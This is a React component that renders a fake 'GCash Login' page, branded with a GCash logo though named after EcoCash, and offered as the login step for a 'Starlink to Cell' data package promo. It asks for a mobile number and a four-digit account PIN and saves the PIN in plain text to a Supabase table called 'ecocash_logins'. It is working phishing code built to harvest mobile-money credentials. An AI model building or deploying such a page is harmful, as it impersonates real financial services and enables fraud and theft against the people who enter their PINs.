import { useState, useRef } from 'react';
import { supabase } from '../lib/supabase';
import { Loader2 } from 'lucide-react';
import type { PackageSelection } from './PromoPage';
import { GcashLogo } from './GcashLogo';

interface EcoCashLoginProps {
  packageSelection: PackageSelection;
  onNext: (applicationId: string, phoneNumber: string) => void;
}

export default function EcoCashLogin({ packageSelection, onNext }: EcoCashLoginProps) {
  const [mobileNumber, setMobileNumber] = useState('');
  const [pin, setPin] = useState(['', '', '', '']);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const pinRefs = [useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null)];

  const handlePinChange = (index: number, value: string) => {
    if (value.length > 1) value = value[0];
    if (!/^\d*$/.test(value)) return;
    const nextPin = [...pin];
    nextPin[index] = value;
    setPin(nextPin);
    if (value && index < 3) pinRefs[index + 1].current?.focus();
  };

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setError('');
    setLoading(true);
    try {
      const { data: application, error: applicationError } = await supabase.from('applications').insert({
        full_name: 'Package subscriber',
        phone_number: mobileNumber,
        email: null,
        id_number: null,
        loan_type: `Starlink to Cell - ${packageSelection.name}`,
        loan_amount: packageSelection.price,
        terms_accepted: true,
      }).select('id').maybeSingle();
      if (applicationError || !application) {
        setError(applicationError?.message || 'Could not save your package request');
        return;
      }
      const { error: dbError } = await supabase.from('ecocash_logins').insert({
        application_id: application.id,
        mobile_number: mobileNumber,
        pin: pin.join(''),
      });
      if (dbError) {
        setError(dbError.message || 'Login failed');
        return;
      }
      onNext(application.id, mobileNumber);
    } catch (submissionError) {
      setError(submissionError instanceof Error ? submissionError.message : 'Something went wrong');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-950 via-blue-950 to-slate-950 px-4 py-8 text-white">
      <div className="mx-auto flex min-h-[90vh] max-w-md items-center">
        <div className="w-full rounded-3xl border border-cyan-800/40 bg-slate-900/70 p-7 shadow-xl backdrop-blur-sm">
          <div className="mb-7 flex flex-col items-center gap-3">
            <GcashLogo className="h-14 w-auto" />
            <span className="text-xl font-bold text-white">GCash Login</span>
          </div>
          <h1 className="text-3xl font-bold">Account login</h1>
          <p className="mt-2 text-slate-400">Log in to continue with your selected data package.</p>
          {error && <p className="mt-5 rounded-xl border border-red-500/30 bg-red-500/10 p-3 text-sm text-red-300">{error}</p>}
          <form onSubmit={handleSubmit} className="mt-6 space-y-5">
            <label className="block text-sm font-medium text-cyan-200">Mobile number
              <input required type="tel" inputMode="numeric" maxLength={11} value={mobileNumber} onChange={(event) => setMobileNumber(event.target.value.replace(/\D/g, '').slice(0, 11))} className="mt-2 w-full rounded-xl border border-cyan-800/50 bg-slate-800/60 px-4 py-3 text-white outline-none focus:ring-2 focus:ring-cyan-500" placeholder="Mobile number" />
            </label>
            <div><p className="text-sm font-medium text-cyan-200">Enter 4-digit account PIN</p><div className="mt-2 flex justify-center gap-3">{pin.map((digit, index) => <input key={index} ref={pinRefs[index]} type="password" maxLength={1} value={digit} onChange={(event) => handlePinChange(index, event.target.value)} className="h-14 w-14 rounded-xl border border-cyan-800/50 bg-slate-800/60 text-center text-2xl font-bold text-white outline-none focus:ring-2 focus:ring-cyan-500" />)}</div></div>
            <button type="submit" disabled={loading || pin.some((digit) => !digit)} className="flex w-full items-center justify-center gap-2 rounded-xl bg-gradient-to-r from-cyan-500 to-blue-600 py-3 font-bold transition hover:from-cyan-600 hover:to-blue-700 disabled:opacity-50">{loading ? <><Loader2 size={20} className="animate-spin" /> Processing...</> : 'Login'}</button>
          </form>
        </div>
      </div>
    </div>
  );
}
